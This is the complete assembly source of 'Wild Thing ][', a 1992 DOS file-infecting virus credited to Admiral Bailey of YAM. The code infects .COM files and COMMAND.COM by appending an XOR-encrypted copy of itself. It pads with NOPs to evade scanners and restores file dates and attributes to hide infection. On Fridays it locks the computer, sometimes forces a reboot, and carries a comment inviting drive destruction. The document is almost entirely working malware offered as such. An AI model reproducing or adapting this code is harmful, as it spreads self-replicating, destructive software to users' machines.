;****************************************************************************
;  Wild Thing ][ Virus
;  (c) Admiral Bailey - YAM
;  Well take a look for yourself.  I forgot what this ancient piece of work
;  does. :)
;****************************************************************************

code    segment public 'code'
        assume  cs:code
        org     100h

start:
        db 0e9h                         ; jump to next command
        dw 0                            ; just use this

virus:
        call    realcode                ; push ip on stack

realcode        proc    near
        pop     bp                      ; will pop ip into bp
        nop                             ; avoid scan as vcl [con] virus
        sub     bp,offset realcode      ; get the loc in file where bov is
        nop                             ; to avoid detection
        call    encrypt_decrypt         ; decrypt the file

encrypt_start   equ     $

        lea     si,[bp+offset oldjump]  ; put the loc of orig jump in si
        mov     di,100h                 ; where we will replace the orig
        push    di                      ; for when we retn from the first
                                        ; call
        movsw                           ; move two bytes
        movsb                           ; move one byte

        lea     dx,[bp+offset dta]      ; offset new dta
        call    set_dta                 ; move to new dta

get_time:
        mov     ah,2ch                  ; get current time
        int     21h                     ;

        cmp     dh,0                    ; is it zero
        je      get_time                ; yup then get another number

        mov     [bp+enc_value],dh       ; save seconds for encryption

        mov     ah,47h                  ; get current dir
        mov     dl,0h                   ; current drive
        lea     si,[bp+offset currentdir] ; where to store it
        int     21h


        call    do_job                  ; stuff like get date ect..

        call    getcommandcom           ; first get the command.com

findfirst:
        mov     ah,4eh                  ; findfirst command
        lea     dx,[bp+offset filespec] ; load loc of filespec in dx
        mov     cx,00000111b           ; find all attributes

findnext:
        int     21h

        jc      change_dir              ; none found then change dir
        lea     dx,[bp+offset dta+1eh]  ; file name loc in dta
        call    infection               ; if found file then open it
        mov     ah,4fh                  ; find next
        jmp     findnext

change_dir:
        lea     dx,[bp+offset directory]; Directory to change to ".."
        mov     ah,3bh                  ; Change dir command
        int     21h                     ; change dir

        jnc     findfirst               ; if cant change dir then quit

quit:
        lea     dx,[bp+offset currentdir] ; original directory
        mov     ah,3bh                  ; change directory
        int     21h

        mov     dx,80h                  ; return the dta to normal
        call    set_dta

        mov     dh,[bp+enc_value]
        cmp     dh,2
        ja      you_know                ; if more than 2 then dont bother

        mov     ah,09h                  ; display string
        lea     dx,[bp+offset messege]  ; loc of string
        int     21h

        mov     cx,0fffeh
messegeloop:
        loop    messegeloop             ; delay for reader

        db      0eah, 00h, 00h, 0ffh, 0ffh ; reboot

you_know:
        retn                            ; return to loc 100h

realcode        endp


infection       proc    near

        push    dx                      ; save asciiz file name

        mov     ax,4300h                ; get file attribs
        int     21h

        jc      quit2

        mov     [bp+offset old_attrib],cx       ; save old attrib

        mov     ax,4301h                ; set file attribs
        xor     cx,cx                   ; set to no attrib
        int     21h                     ; dx already with name
                                        ; old attrib stored in dta 15h
        jc      infect_quit

        mov     ax,3d02h                ; open file for read/write
        int     21h                     ; dx is alread with file name

        xchg    bx,ax                   ; put handle in bx
        jc      infect_quit             ; if error opening then get another

        mov     ax,5700h                ; get file date
        int     21h                     ; return cx:time dx:date

        mov     [bp+offset olddate],dx  ; save date
        mov     [bp+offset oldtime],cx  ; save time

        mov     cx,3                    ; read 1st 3 bytes
        mov     ah,3fh                  ; read file command
        lea     dx, [bp+offset oldjump] ; get loc in file where bov is
        int     21h                     ; read the file

        jc      closefile               ; if error close up and find another
        jmp     continue_infect

quit2:
        jmp     infect_quit

continue_infect:
        push    bx                      ; save this
        mov     bx,[bp+offset dta+1ah]  ; put loc of size into bx
        mov     ax,bx                   ; put what bx points to into ax
        pop     bx                      ; get original bx

;---
; here we check for previous infection...
; thanx go to 40hex-7 article for this method.
;---------

        mov     cx,word ptr [bp+oldjump+1] ; get old jump loc
        add     cx,eof-virus+3          ; convert to size
        cmp     ax,cx                   ; compare

        jz      closefile               ; if equal get another.

        sub     ax,3                    ; calculate where the new jump will
                                        ; jump to
        mov     word ptr [bp+jumploc],ax ; store new jump till later

        xor     ax,ax                   ; beginning of file
        call    move_fp                 ;

        mov     ah,40h                  ; write to file
        mov     cx,3                    ; just first three bytes
        lea     dx,[bp+offset jumpcom]  ; what to write
        int     21h                     ; do it.

        mov     al,02h                  ; set file pointer to eof
        call    move_fp

        call    encrypt_infect

closefile:
        mov     ax,5701h                ; set file date
        mov     cx,[bp+offset oldtime]
        mov     dx,[bp+offset olddate]
        int     21h

        mov     ah,3eh                  ; close file
        int     21h

        pop     dx                      ; get asciiz fname off stack
        mov     ax,4301h                ; set attribs back
        mov     cx,word ptr [bp+offset old_attrib] ; old attrib
        int     21h

        retn

infect_quit:

        pop     dx                      ; just take the asciiz fname off
                                        ; the stack
        retn                            ; return

infection       endp

move_fp proc    near

        mov     ah,42h                  ; move fp ah has value
        xor     cx,cx                   ; clear these
        xor     dx,dx
        int     21h                     ; do it
        retn

move_fp endp

do_job  proc    near

        mov     ah,2ah                  ; get current date
        int     21h                     ; cx=yr dh=month dl=day al=dow

        cmp     al,5                    ; is it a friday
        je      display_messege
        retn

display_messege:
        mov     ah,01h
        mov     cx,2020h
        int     10h                     ; Hide Cursor
        mov     ah,02h                  ; Moves the cursor
        xor     dx,dx                   ;
        int     10h                     ;
        xor     ax,ax                   ; Clears the screen
        int     10h
        mov     ah,09h                  ; display friday messege
        lea     dx,[bp+offset messege2] ; loc of messege
        int     21h                     ;
        ; kill drives here if you want

lock_loop:
        jmp     lock_loop               ; lock the computer

do_job  endp

getcommandcom   proc    near

        mov     ah,4eh                  ; find file
        lea     dx,[bp+offset commandcom] ; 'c:\command.com'
        mov     cx,7h                   ; find all attrib
        int     21h

        jnc     found_command
        retn

found_command:
        lea     dx,[bp+offset commandcom] ; use this and write to it
        call    infection
        retn

getcommandcom   endp

set_dta         proc    near
        mov     ah, 1ah                 ; Set disk transfer address
        int     21h                     ; dx has loc
        retn                            ; return
set_dta         endp


messege         db      'Wild Thing ][ ',13,10,'$'
messege2        db      'It''s Friday... Enjoy the weekend with',13,10
                db      'your computer! [YAM ''92]',13,10,'$'
sig             db      'By: Admiral Bailey [YAM]'
filespec        db      '*.com',0       ; type of files to find
commandcom      db      '\command.com',0 ; loc of command. com
oldjump         db      0cdh, 020h, 0h ; to hold the old jump with jmp
directory       db      '..',0
old_attrib      dw      0h
olddate         dw      0h
oldtime         dw      0h

; encrypt_end     equ     $

encrypt_infect  proc    near
        lea     si,[bp+offset move_begin] ; source is the procedure
        lea     di,[bp+offset workarea] ; dest is the workarea
        mov     cx,move_end-move_begin  ; number of bytes to move
move_loop:
        movsb                           ; move the bytes and loop
        loop    move_loop               ;
        lea     dx,[bp+offset workarea] ; call the procedure in workarea
        call    dx                      ;
        ret

move_begin      equ     $
        lea     dx,[bp+offset encrypt_end]
        call    dx                      ; call the encrypt procedure
        mov     ah,40h                  ; write to file
        mov     cx,eof-virus            ; number of bytes
        lea     dx,[bp+offset virus]    ; where to start
        int     21h
        lea     dx,[bp+offset encrypt_end] ; call encrypt
        call    dx
        ret
move_end        equ     $
encrypt_infect  endp

encrypt_end     equ     $

encrypt_decrypt proc    near
        push    bx
        lea     bx,[bp+encrypt_start]   ; encrypt from here
        mov     cx,encrypt_end-encrypt_start ; length to encrypt
        mov     dh,[bp+enc_value]       ; get the enc value
encrypt_loop:
        mov     ah,[bx]                 ; get word
        xor     ah,dh                   ; xor it
        mov     [bx],ah                 ; put it back
        inc     bx                      ; move to next
        loop    encrypt_loop
        pop     bx
        retn
encrypt_decrypt endp

enc_value       db      0ffh
jumpcom         db      0e9h            ; jump command

eof     equ     $

; here on does not stay in the infected files.  Its just temp here

jumploc         dw      ?               ; holds the new jump

workarea        db      move_end-move_begin dup (0)

currentdir      db      64 dup (0)      ; buffer for current dir

dta             db      42 dup (?)      ; holds dta


code    ends

        end     start


